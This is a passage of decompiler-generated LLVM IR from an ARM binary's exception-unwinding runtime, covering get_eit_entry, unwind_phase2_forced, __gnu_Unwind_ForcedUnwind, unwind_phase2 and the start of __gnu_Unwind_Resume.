  %v0_17584 = call i32 @abort()
  ret i32 %v0_17584
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_17590 = call i32 @abort()
  ret i32 %v0_17590
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_17594 = load i32, i32* @r4, align 4
  store i32 %v3_17594, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r5.global-to-local, align 4
  %v4_175a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 140) to i32*), align 4
  %v2_175a8 = icmp eq i32 %v4_175a4, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_175b4 = add i32 %return_address, -2
  store i32 %v1_175b4, i32* %r4.global-to-local, align 4
  br i1 %v2_175a8, label %dec_label_pc_175ec, label %dec_label_pc_175bc

dec_label_pc_175bc:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_175a4)
  %v2_175cc = icmp eq i32 %v1_175b4, 0
  br i1 %v2_175cc, label %.thread, label %dec_label_pc_1760cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_175bc
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_175d4 = load i32, i32* %r6.global-to-local, align 4
  %v3_175d4 = add i32 %v2_175d4, 16
  %v4_175d4 = inttoptr i32 %v3_175d4 to i32*
  store i32 0, i32* %v4_175d4, align 4
  br label %dec_label_pc_175dc

dec_label_pc_175dc:                               ; preds = %.thread, %.thread10, %dec_label_pc_17784, %dec_label_pc_17770, %dec_label_pc_1774c, %dec_label_pc_17724, %dec_label_pc_17624
  %v0_175dc = load i32, i32* %r2.global-to-local, align 4
  %v2_175e4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_175e4, i32* @r4, align 4
  ret i32 %v0_175dc

dec_label_pc_175ec:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_175f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 20) to i32*), align 4
  %v4_175f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 52) to i32*), align 4
  store i32 %v4_175f8, i32* %r2.global-to-local, align 4
  %v2_175fc = sub i32 %v4_175f4, %v4_175f8
  %v3_17600 = sdiv i32 %v2_175fc, 8
  store i32 %v3_17600, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1760c

dec_label_pc_1760cthread-pre-split:               ; preds = %dec_label_pc_175bc
  %v3_1760c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1760c

dec_label_pc_1760c:                               ; preds = %dec_label_pc_1760cthread-pre-split, %dec_label_pc_175ec
  %v0_17650.pre = phi i32 [ %v1_175b4, %dec_label_pc_1760cthread-pre-split ], [ %v4_175f8, %dec_label_pc_175ec ]
  %v1_17614 = phi i32 [ %v3_1760c.pr, %dec_label_pc_1760cthread-pre-split ], [ %v3_17600, %dec_label_pc_175ec ]
  %v2_17610 = icmp eq i32 %v1_17614, 0
  br i1 %v2_17610, label %dec_label_pc_17624, label %dec_label_pc_17640.preheader

dec_label_pc_17640.preheader:                     ; preds = %dec_label_pc_1760c
  %v2_17614 = add i32 %v1_17614, -1
  %v1_17670 = add i32 %v0_17650.pre, 8
  br label %dec_label_pc_17640.outer

dec_label_pc_17624.loopexit:                      ; preds = %dec_label_pc_1769c
  br label %dec_label_pc_17624

dec_label_pc_17624:                               ; preds = %dec_label_pc_17624.loopexit, %dec_label_pc_1760c, %dec_label_pc_17768
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_1762c = load i32, i32* %r6.global-to-local, align 4
  %v2_1762c = add i32 %v1_1762c, 16
  %v3_1762c = inttoptr i32 %v2_1762c to i32*
  store i32 0, i32* %v3_1762c, align 4
  br label %dec_label_pc_175dc

dec_label_pc_17634:                               ; preds = %dec_label_pc_17690
  %v3_17634 = icmp ult i32 %storemerge40, %v0_17694
  br i1 %v3_17634, label %dec_label_pc_1763c, label %dec_label_pc_176ac

dec_label_pc_1763c:                               ; preds = %dec_label_pc_17634
  %v1_1763c = add nsw i32 %v3_17648, 1
  br label %dec_label_pc_17640.outer

dec_label_pc_17640.outer:                         ; preds = %dec_label_pc_1763c, %dec_label_pc_17640.preheader
  %v1_1769c.ph = phi i32 [ %v1_1763c, %dec_label_pc_1763c ], [ 0, %dec_label_pc_17640.preheader ]
  %v0_17640.ph = phi i32 [ %v0_17640, %dec_label_pc_1763c ], [ %v2_17614, %dec_label_pc_17640.preheader ]
  br label %dec_label_pc_17640

dec_label_pc_17640:                               ; preds = %dec_label_pc_17640.outer, %dec_label_pc_176a4
  %v0_17640 = phi i32 [ %v1_176a4, %dec_label_pc_176a4 ], [ %v0_17640.ph, %dec_label_pc_17640.outer ]
  %v2_17640 = add i32 %v0_17640, %v1_1769c.ph
  %tmp = icmp slt i32 %v2_17640, 0
  %v4_17644 = zext i1 %tmp to i32
  %v5_17644 = add i32 %v4_17644, %v2_17640
  %v3_17648 = sdiv i32 %v5_17644, 2
  %v3_1764c = mul i32 %v3_17648, 8
  store i32 %v3_1764c, i32* @ip, align 4
  %v2_17650 = add i32 %v3_1764c, %v0_17650.pre
  %v3_17650 = inttoptr i32 %v2_17650 to i32*
  %v4_17650 = load i32, i32* %v3_17650, align 4
  %v1_17654 = and i32 %v4_17650, 1073741824
  %v2_17654 = icmp eq i32 %v1_17654, 0
  %v2_17658 = or i32 %v4_17650, -2147483648
  %tmp79 = bitcast i32 %v4_17650 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_1765c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_17654, i32 %v2_1765c, i32 %v2_17658
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_17660 = icmp eq i32 %v2_17614, %v3_17648
  store i32 %v2_17650, i32* %r7.global-to-local, align 4
  br i1 %v9_17660, label %dec_label_pc_17690, label %dec_label_pc_17670

dec_label_pc_17670:                               ; preds = %dec_label_pc_17640
  %v2_17674 = add i32 %v3_1764c, %v1_17670
  %v3_17674 = inttoptr i32 %v2_17674 to i32*
  %v4_17674 = load i32, i32* %v3_17674, align 4
  %v1_1767c = and i32 %v4_17674, 1073741824
  %v2_1767c = icmp eq i32 %v1_1767c, 0
  %v2_17680 = or i32 %v4_17674, -2147483648
  %tmp81 = bitcast i32 %v4_17674 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_17684 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_1767c, i32 %v2_17684, i32 %v2_17680
  %v1_17688 = add i32 %v2_17674, -1
  %v2_1768c = add i32 %storemerge39, %v1_17688
  br label %dec_label_pc_17690

dec_label_pc_17690:                               ; preds = %dec_label_pc_17640, %dec_label_pc_17670
  %storemerge40 = phi i32 [ %v2_1768c, %dec_label_pc_17670 ], [ -1, %dec_label_pc_17640 ]
  %v2_17690 = add i32 %storemerge, %v2_17650
  %v0_17694 = load i32, i32* %r4.global-to-local, align 4
  %v3_17694 = icmp ult i32 %v0_17694, %v2_17690
  br i1 %v3_17694, label %dec_label_pc_1769c, label %dec_label_pc_17634

dec_label_pc_1769c:                               ; preds = %dec_label_pc_17690
  %v9_1769c = icmp eq i32 %v3_17648, %v1_1769c.ph
  br i1 %v9_1769c, label %dec_label_pc_17624.loopexit, label %dec_label_pc_176a4

dec_label_pc_176a4:                               ; preds = %dec_label_pc_1769c
  %v1_176a4 = add nsw i32 %v3_17648, -1
  br label %dec_label_pc_17640

dec_label_pc_176ac:                               ; preds = %dec_label_pc_17634
  %v2_176ac = load i32, i32* %v3_17650, align 4
  %v1_176b0 = and i32 %v2_176ac, 1073741824
  %v2_176b0 = icmp eq i32 %v1_176b0, 0
  %v2_176b4 = or i32 %v2_176ac, -2147483648
  %tmp83 = bitcast i32 %v2_176ac to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_176b8 = bitcast float %tmp84 to i32
  %v0_176bc = select i1 %v2_176b0, i32 %v2_176b8, i32 %v2_176b4
  %v2_176bc = add i32 %v0_176bc, %v2_17650
  %v1_176c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_176c0 = add i32 %v1_176c0, 72
  %v3_176c0 = inttoptr i32 %v2_176c0 to i32*
  store i32 %v2_176bc, i32* %v3_176c0, align 4
  %v0_176c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_176c4 = add i32 %v0_176c4, 4
  %v2_176c4 = inttoptr i32 %v1_176c4 to i32*
  %v3_176c4 = load i32, i32* %v2_176c4, align 4
  %v7_176c8 = icmp eq i32 %v3_176c4, 1
  br i1 %v7_176c8, label %.thread10, label %dec_label_pc_176dc

.thread10:                                        ; preds = %dec_label_pc_176ac
  %v1_176c8 = add i32 %v3_176c4, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_176d4 = load i32, i32* %r6.global-to-local, align 4
  %v3_176d4 = add i32 %v2_176d4, 16
  %v4_176d4 = inttoptr i32 %v3_176d4 to i32*
  store i32 %v1_176c8, i32* %v4_176d4, align 4
  br label %dec_label_pc_175dc

dec_label_pc_176dc:                               ; preds = %dec_label_pc_176ac
  %v1_176dc = icmp slt i32 %v3_176c4, 0
  br i1 %v1_176dc, label %.thread38, label %dec_label_pc_176f4

.thread38:                                        ; preds = %dec_label_pc_176dc
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_176e8 = load i32, i32* %r6.global-to-local, align 4
  %v5_176e8 = add i32 %v4_176e8, 76
  %v6_176e8 = inttoptr i32 %v5_176e8 to i32*
  store i32 %v1_176c4, i32* %v6_176e8, align 4
  %v3_176ec = load i32, i32* %r2.global-to-local, align 4
  %v4_176ec = load i32, i32* %r6.global-to-local, align 4
  %v5_176ec = add i32 %v4_176ec, 80
  %v6_176ec = inttoptr i32 %v5_176ec to i32*
  store i32 %v3_176ec, i32* %v6_176ec, align 4
  br label %dec_label_pc_17714

dec_label_pc_176f4:                               ; preds = %dec_label_pc_176dc
  %v1_176f4 = and i32 %v3_176c4, 1073741824
  %v2_176f4 = icmp eq i32 %v1_176f4, 0
  %v2_176f8 = or i32 %v3_176c4, -2147483648
  %tmp85 = bitcast i32 %v3_176c4 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_176fc = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_176f4, i32 %v2_176fc, i32 %v2_176f8
  %v1_17700 = add i32 %storemerge42, 4
  %v2_17704 = add i32 %v1_17700, %v0_176c4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1770c = load i32, i32* %r6.global-to-local, align 4
  %v2_1770c = add i32 %v1_1770c, 76
  %v3_1770c = inttoptr i32 %v2_1770c to i32*
  store i32 %v2_17704, i32* %v3_1770c, align 4
  %v0_17710 = load i32, i32* %r2.global-to-local, align 4
  %v1_17710 = load i32, i32* %r6.global-to-local, align 4
  %v2_17710 = add i32 %v1_17710, 80
  %v3_17710 = inttoptr i32 %v2_17710 to i32*
  store i32 %v0_17710, i32* %v3_17710, align 4
  br label %dec_label_pc_17714

dec_label_pc_17714:                               ; preds = %.thread38, %dec_label_pc_176f4
  %v0_17714 = load i32, i32* %r6.global-to-local, align 4
  %v1_17714 = add i32 %v0_17714, 76
  %v2_17714 = inttoptr i32 %v1_17714 to i32*
  %v3_17714 = load i32, i32* %v2_17714, align 4
  store i32 %v3_17714, i32* %r2.global-to-local, align 4
  %v1_17718 = inttoptr i32 %v3_17714 to i32*
  %v2_17718 = load i32, i32* %v1_17718, align 4
  %v1_1771c = icmp slt i32 %v2_17718, 0
  br i1 %v1_1771c, label %dec_label_pc_17740, label %dec_label_pc_17724

dec_label_pc_17724:                               ; preds = %dec_label_pc_17714
  %v1_17724 = and i32 %v2_17718, 1073741824
  %v2_17724 = icmp eq i32 %v1_17724, 0
  %v2_17728 = or i32 %v2_17718, -2147483648
  %tmp87 = bitcast i32 %v2_17718 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1772c = bitcast float %tmp88 to i32
  %v0_17730 = select i1 %v2_17724, i32 %v2_1772c, i32 %v2_17728
  %v2_17730 = add i32 %v0_17730, %v3_17714
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_17738 = add i32 %v0_17714, 16
  %v3_17738 = inttoptr i32 %v2_17738 to i32*
  store i32 %v2_17730, i32* %v3_17738, align 4
  br label %dec_label_pc_175dc

dec_label_pc_17740:                               ; preds = %dec_label_pc_17714
  %v3_17740 = udiv i32 %v2_17718, 16777216
  %v1_17744 = urem i32 %v3_17740, 16
  %v2_17744 = icmp eq i32 %v1_17744, 0
  br i1 %v2_17744, label %dec_label_pc_1774c, label %dec_label_pc_17760

dec_label_pc_1774c:                               ; preds = %dec_label_pc_17740
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17754 = load i32, i32* %r5.global-to-local, align 4
  %v2_17754 = add i32 %v0_17754, -41264
  %v2_17758 = add i32 %v0_17714, 16
  %v3_17758 = inttoptr i32 %v2_17758 to i32*
  store i32 %v2_17754, i32* %v3_17758, align 4
  br label %dec_label_pc_175dc

dec_label_pc_17760:                               ; preds = %dec_label_pc_17740
  %v7_17760 = icmp eq i32 %v1_17744, 1
  br i1 %v7_17760, label %dec_label_pc_17784, label %dec_label_pc_17768

dec_label_pc_17768:                               ; preds = %dec_label_pc_17760
  %v7_17768 = icmp eq i32 %v1_17744, 2
  br i1 %v7_17768, label %dec_label_pc_17770, label %dec_label_pc_17624

dec_label_pc_17770:                               ; preds = %dec_label_pc_17768
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17778 = load i32, i32* %r5.global-to-local, align 4
  %v2_17778 = add i32 %v0_17778, -41280
  %v2_1777c = add i32 %v0_17714, 16
  %v3_1777c = inttoptr i32 %v2_1777c to i32*
  store i32 %v2_17778, i32* %v3_1777c, align 4
  br label %dec_label_pc_175dc

dec_label_pc_17784:                               ; preds = %dec_label_pc_17760
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1778c = load i32, i32* %r5.global-to-local, align 4
  %v2_1778c = add i32 %v0_1778c, -41272
  %v2_17790 = add i32 %v0_17714, 16
  %v3_17790 = inttoptr i32 %v2_17790 to i32*
  store i32 %v2_1778c, i32* %v3_17790, align 4
  br label %dec_label_pc_175dc

; uselistorder directives
  uselistorder i32 %v1_17744, { 2, 1, 0 }
  uselistorder i32 %v0_17714, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_176c4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_17694, { 1, 0 }
  uselistorder i32 %v3_1764c, { 2, 1, 0 }
  uselistorder i32 %v3_17648, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_17640, { 1, 0 }
  uselistorder i32 %v0_17640, { 1, 0 }
  uselistorder i32 %v2_17614, { 1, 0 }
  uselistorder i32 %v0_17650.pre, { 1, 0 }
  uselistorder i32 %v3_17600, { 1, 0 }
  uselistorder i32 %v1_175b4, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder label %dec_label_pc_17714, { 1, 0 }
  uselistorder label %dec_label_pc_17690, { 1, 0 }
  uselistorder label %dec_label_pc_17640, { 1, 0 }
  uselistorder label %dec_label_pc_17624, { 2, 0, 1 }
  uselistorder label %dec_label_pc_175dc, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1779c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1779c:
  %v0_1779c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1779c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1779c
  %v2_1779c = load i32, i32* @ip, align 4
  %v4_1779c = mul i32 %v2_1779c, 2
  %v5_1779c = and i32 %v4_1779c, %arg1
  %v2_177a0 = load i32, i32* @r4, align 4
  %v8_177a0 = shl i32 %v2_177a0, %v5_1779c
  %v9_177a0 = and i32 %v8_177a0, %v5_1779c
  %v8_177a4 = lshr i32 %v2_177a0, %v9_177a0
  %v9_177a4 = and i32 %v8_177a4, %v9_177a0
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1779c, %bb
  %v10_177a4 = phi i32 [ %arg1, %dec_label_pc_1779c ], [ %v9_177a4, %bb ]
  ret i32 %v10_177a4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_177b8 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_177cc = inttoptr i32 %v1_177b8 to i32*
  %v2_177cc = load i32, i32* %v1_177cc, align 4
  store i32 %v2_177cc, i32* %r0.global-to-local, align 4
  %v12_177cc = add i32 %entry_vrs, 20
  %v1_177d8 = inttoptr i32 %v12_177cc to i32*
  %v2_177d8 = load i32, i32* %v1_177d8, align 4
  store i32 %v2_177d8, i32* %r0.global-to-local, align 4
  %v12_177d8 = add i32 %entry_vrs, 36
  %v1_177e0 = inttoptr i32 %v12_177d8 to i32*
  %v2_177e0 = load i32, i32* %v1_177e0, align 4
  store i32 %v2_177e0, i32* %r0.global-to-local, align 4
  %v12_177e0 = add i32 %entry_vrs, 52
  store i32 %v12_177e0, i32* @ip, align 4
  %v13_177e4 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_177e4, i32* @lr, align 4
  %v1_177e8 = inttoptr i32 %v12_177e0 to i32*
  %v2_177e8 = load i32, i32* %v1_177e8, align 4
  store i32 %v2_177e8, i32* %r0.global-to-local, align 4
  %v9_177e8 = add i32 %entry_vrs, 64
  %v10_177e8 = inttoptr i32 %v9_177e8 to i32*
  %v11_177e8 = load i32, i32* %v10_177e8, align 4
  store i32 0, i32* @r4, align 4
  %v1_177f0 = add i32 %ucbp, 12
  %v2_177f0 = inttoptr i32 %v1_177f0 to i32*
  %v3_177f0 = load i32, i32* %v2_177f0, align 4
  store i32 %v2_177e8, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_17808 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_177e8)
  store i32 %v2_17808, i32* %r0.global-to-local, align 4
  %v0_1780c = load i32, i32* @r6, align 4
  %v1_1780c = load i32, i32* @r4, align 4
  %v9_1780c = icmp eq i32 %v0_1780c, %v1_1780c
  store i32 %v2_17808, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_1780c, label %dec_label_pc_17820, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1782c

dec_label_pc_17820:                               ; preds = %entry
  store i32 %v0_1780c, i32* @r4, align 4
  br label %dec_label_pc_17828

dec_label_pc_17828:                               ; preds = %dec_label_pc_178f0, %dec_label_pc_17820
  br label %dec_label_pc_1782c

dec_label_pc_1782c:                               ; preds = %.thread, %dec_label_pc_17828
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_17828 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1782c = icmp eq i32 %v2_17808, 0
  br i1 %v2_1782c, label %dec_label_pc_178a4, label %.thread2.dec_label_pc_17840_crit_edge

.thread2.dec_label_pc_17840_crit_edge:            ; preds = %dec_label_pc_1782c
  br label %dec_label_pc_17840

dec_label_pc_17840:                               ; preds = %.thread2.dec_label_pc_17840_crit_edge, %dec_label_pc_178a4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_17850 = load i32, i32* @r5, align 4
  store i32 %v0_17850, i32* @r3, align 4
  store i32 96352, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_177f0)
  br i1 false, label %dec_label_pc_17868, label %dec_label_pc_17890

dec_label_pc_17868:                               ; preds = %dec_label_pc_17840
  br i1 undef, label %dec_label_pc_17870, label %dec_label_pc_17894

dec_label_pc_17870:                               ; preds = %dec_label_pc_17868
  br i1 undef, label %dec_label_pc_178f0, label %dec_label_pc_17888

dec_label_pc_17888:                               ; preds = %dec_label_pc_17870
  br i1 undef, label %dec_label_pc_178e8, label %dec_label_pc_17890

dec_label_pc_17890:                               ; preds = %dec_label_pc_17840, %dec_label_pc_17888
  br label %dec_label_pc_17894

dec_label_pc_17894:                               ; preds = %dec_label_pc_17868, %dec_label_pc_17890
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_178a4:                               ; preds = %dec_label_pc_1782c
  store i32 %v11_177e8, i32* @r3, align 4
  %v2_178a8 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_178a8, i32* @r4, align 4
  %v1_178ac = load i32, i32* @r5, align 4
  %v2_178ac = add i32 %v1_178ac, 20
  %v3_178ac = inttoptr i32 %v2_178ac to i32*
  store i32 %v11_177e8, i32* %v3_178ac, align 4
  store i32 %v2_178a8, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_178bc = call i32 @memcpy()
  %v0_178c4 = load i32, i32* @r6, align 4
  store i32 %v0_178c4, i32* %r0.global-to-local, align 4
  %v0_178c8 = load i32, i32* @r5, align 4
  %v1_178cc = add i32 %v0_178c8, 16
  %v2_178cc = inttoptr i32 %v1_178cc to i32*
  %v3_178cc = load i32, i32* %v2_178cc, align 4
  store i32 %v3_178cc, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_178cc)
  %v0_178dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_178dc, i32* @r4, align 4
  br label %dec_label_pc_17840

dec_label_pc_178e8:                               ; preds = %dec_label_pc_17888
  br label %dec_label_pc_178f0

dec_label_pc_178f0:                               ; preds = %dec_label_pc_17870, %dec_label_pc_178e8
  br label %dec_label_pc_17828

; uselistorder directives
  uselistorder i32 %v11_177e8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 7, 8, 9, 10, 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i32 ()* @memcpy, { 0, 16, 22, 21, 20, 19, 18, 15, 14, 11, 10, 9, 8, 7, 6, 3, 17, 2, 13, 12, 5, 1, 4 }
  uselistorder i32* @r3, { 105, 106, 16, 17, 14, 15, 18, 19, 9, 20, 21, 22, 23, 50, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 51, 37, 38, 39, 40, 41, 42, 52, 53, 54, 55, 56, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 88, 3, 87, 7, 60, 46, 62, 63, 64, 65, 66, 67, 48, 49, 43, 107, 108, 109, 110, 59, 89, 90, 91, 68, 117, 118, 4, 119, 120, 121, 5, 122, 123, 124, 6, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 0, 143, 144, 145, 146, 61, 44, 45, 69, 70, 71, 72, 73, 74, 75, 47, 147, 111, 154, 155, 156, 148, 149, 150, 151, 152, 1, 153, 8, 101, 102, 57, 58, 94, 95, 96, 92, 112, 113, 114, 115, 116, 11, 12, 13, 160, 157, 158, 159, 2, 161, 162, 163, 93, 97, 98, 99, 100, 10, 103, 104 }
  uselistorder i32 10, { 1, 25, 7, 26, 8, 9, 10, 3, 32, 34, 35, 27, 28, 11, 29, 12, 38, 41, 42, 43, 24, 30, 14, 13, 4, 45, 44, 15, 46, 16, 47, 17, 48, 49, 2, 39, 40, 33, 6, 31, 52, 0, 36, 37, 18, 50, 19, 5, 21, 22, 20, 23, 51 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_178f0, { 1, 0 }
  uselistorder label %dec_label_pc_17894, { 1, 0 }
  uselistorder label %dec_label_pc_17890, { 1, 0 }
  uselistorder label %dec_label_pc_17840, { 1, 0 }
  uselistorder label %dec_label_pc_1782c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_17904 = add i32 %ucbp, 12
  %v3_17904 = inttoptr i32 %v2_17904 to i32*
  store i32 %stop_fn, i32* %v3_17904, align 4
  %v3_17908 = add i32 %ucbp, 24
  %v4_17908 = inttoptr i32 %v3_17908 to i32*
  store i32 %tmp, i32* %v4_17908, align 4
  %v1_1790c = add i32 %entry_vrs, 60
  %v2_1790c = inttoptr i32 %v1_1790c to i32*
  %v3_1790c = load i32, i32* %v2_1790c, align 4
  %v2_17914 = add i32 %entry_vrs, 64
  %v3_17914 = inttoptr i32 %v2_17914 to i32*
  store i32 %v3_1790c, i32* %v3_17914, align 4
  %v3_1791c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1791c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_179346 = add i32 %vrs, 64
  %v2_179347 = inttoptr i32 %v1_179346 to i32*
  %v3_179348 = load i32, i32* %v2_179347, align 4
  %v2_179389 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_179348)
  store i32 %v2_179389, i32* %r0.global-to-local, align 4
  %v2_1793c11 = icmp eq i32 %v2_179389, 0
  br i1 %v2_1793c11, label %dec_label_pc_17944, label %dec_label_pc_17974

dec_label_pc_17944:                               ; preds = %entry, %dec_label_pc_17944.dec_label_pc_17930_crit_edge
  %v0_17944 = load i32, i32* @r5, align 4
  %v1_17944 = add i32 %v0_17944, 64
  %v2_17944 = inttoptr i32 %v1_17944 to i32*
  %v3_17944 = load i32, i32* %v2_17944, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1794c = load i32, i32* @r4, align 4
  %v2_1794c = add i32 %v1_1794c, 20
  %v3_1794c = inttoptr i32 %v2_1794c to i32*
  store i32 %v3_17944, i32* %v3_1794c, align 4
  %v0_17950 = load i32, i32* @r4, align 4
  %v1_17958 = add i32 %v0_17950, 16
  %v2_17958 = inttoptr i32 %v1_17958 to i32*
  %v3_17958 = load i32, i32* %v2_17958, align 4
  call void @__pseudo_branch(i32 %v3_17958)
  %v0_17964 = load i32, i32* %r0.global-to-local, align 4
  %v7_17964 = icmp eq i32 %v0_17964, 8
  br i1 %v7_17964, label %dec_label_pc_17944.dec_label_pc_17930_crit_edge, label %dec_label_pc_1796c

dec_label_pc_17944.dec_label_pc_17930_crit_edge:  ; preds = %dec_label_pc_17944
  %v0_17930.pre = load i32, i32* @r4, align 4
  %v0_17934.pre = load i32, i32* @r5, align 4
  store i32 %v0_17930.pre, i32* %r0.global-to-local, align 4
  %v1_17934 = add i32 %v0_17934.pre, 64
  %v2_17934 = inttoptr i32 %v1_17934 to i32*
  %v3_17934 = load i32, i32* %v2_17934, align 4
  %v2_17938 = call i32 @get_eit_entry(i32 %v0_17930.pre, i32 %v3_17934)
  store i32 %v2_17938, i32* %r0.global-to-local, align 4
  %v2_1793c = icmp eq i32 %v2_17938, 0
  br i1 %v2_1793c, label %dec_label_pc_17944, label %dec_label_pc_17974

dec_label_pc_1796c:                               ; preds = %dec_label_pc_17944
  %v7_1796c = icmp eq i32 %v0_17964, 7
  br i1 %v7_1796c, label %dec_label_pc_17978, label %dec_label_pc_17974

dec_label_pc_17974:                               ; preds = %entry, %dec_label_pc_17944.dec_label_pc_17930_crit_edge, %dec_label_pc_1796c
  %v0_17974 = call i32 @abort()
  store i32 %v0_17974, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17978

dec_label_pc_17978:                               ; preds = %dec_label_pc_1796c, %dec_label_pc_17974
  %v0_17978 = load i32, i32* @r5, align 4
  %v1_17978 = add i32 %v0_17978, 4
  store i32 %v1_17978, i32* %r0.global-to-local, align 4
  %v1_1797c = inttoptr i32 %v1_17978 to i32*
  %v2_1797c = call i32 @__restore_core_regs(i32* %v1_1797c)
  store i32 %v2_1797c, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_17978, { 1, 0 }
  uselistorder label %dec_label_pc_17974, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17944, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_17980 = add i32 %ucbp, 20
  %v2_17980 = inttoptr i32 %v1_17980 to i32*
  %v3_17980 = load i32, i32* %v2_17980, align 4
  %v1_17988 = load i32, i32* %r1.global-to-local, align 4
  %v2_17988 = add i32 %v1_17988, 64
  %v3_17988 = inttoptr i32 %v2_17988 to i32*
